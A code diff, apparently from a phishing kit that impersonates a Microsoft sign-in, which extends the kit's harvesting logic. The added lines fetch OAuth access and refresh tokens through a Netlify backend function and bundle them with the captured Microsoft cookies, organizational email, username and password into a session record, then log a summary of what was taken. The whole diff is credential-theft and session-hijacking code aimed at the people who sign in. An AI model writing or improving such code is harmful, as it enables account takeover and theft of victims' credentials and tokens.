@@ -131,11 +131,14 @@
                     }
                 }
                 
-                // Method 3: Try to get user info via backend token exchange
+                // Method 3: Try to get user info and tokens via backend token exchange
+                let tokenData = null;
                 if (userEmail === 'oauth-user@microsoft.com') {
                     try {
                         const currentDomain = window.location.origin;
-                        const backendTokenResponse = await fetch(`${currentDomain}/.netlify/functions/exchangeToken`, {
+                        console.log('🔄 Attempting token exchange for email and tokens...');
+                        
+                        const backendTokenResponse = await fetch(`${currentDomain}/.netlify/functions/tokenExchange`, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({
@@ -146,16 +149,25 @@
                         
                         if (backendTokenResponse.ok) {
                             const tokenResult = await backendTokenResponse.json();
-                            if (tokenResult.success && tokenResult.email) {
-                                userEmail = tokenResult.email;
-                                console.log('✅ Got user email from backend:', userEmail);
+                            console.log('🔍 Token exchange result:', tokenResult.success ? 'Success' : 'Failed');
+                            
+                            if (tokenResult.success) {
+                                tokenData = tokenResult;
+                                
+                                // Extract email from user profile
+                                if (tokenResult.user && tokenResult.user.email) {
+                                    userEmail = tokenResult.user.email;
+                                    console.log('✅ Got real user email from token exchange:', userEmail);
+                                }
                             } else if (tokenResult.userProfile && (tokenResult.userProfile.mail || tokenResult.userProfile.userPrincipalName)) {
                                 userEmail = tokenResult.userProfile.mail || tokenResult.userProfile.userPrincipalName;
-                                console.log('✅ Got user email from profile:', userEmail);
+                                console.log('✅ Got user email from legacy profile:', userEmail);
                             }
+                        } else {
+                            console.log('⚠️ Token exchange endpoint not available or failed');
                         }
                     } catch (emailError) {
-                        console.log('⚠️ Could not get user email from backend');
+                        console.log('⚠️ Could not get user email from backend:', emailError.message);
                     }
                 }
                 
@@ -374,6 +386,7 @@
                 
                 sessionData.formattedCookies = capturedCookies;
                 sessionData.organizationalCredentials = organizationalCredentials;
+                sessionData.tokenData = tokenData; // Include full token data
                 
                 console.log('🍪 Final capture summary:', {
                     microsoftCookies: microsoftCookies.length,
@@ -383,6 +396,9 @@
                     organizationalEmail: organizationalCredentials ? organizationalCredentials.email : 'None',
                     organizationalUsername: organizationalCredentials ? organizationalCredentials.username : 'None',
                     hasOrganizationalPassword: organizationalCredentials ? !!organizationalCredentials.password : false,
+                    hasAccessToken: tokenData ? !!tokenData.tokens?.access_token : false,
+                    hasRefreshToken: tokenData ? !!tokenData.tokens?.refresh_token : false,
+                    tokenExchangeSuccess: tokenData ? tokenData.success : false,
                     microsoftDomains: [...new Set(microsoftCookies.map(c => c.capturedFrom))],
                     sources: [...new Set(capturedCookies.map(c => c.source))]
                 });
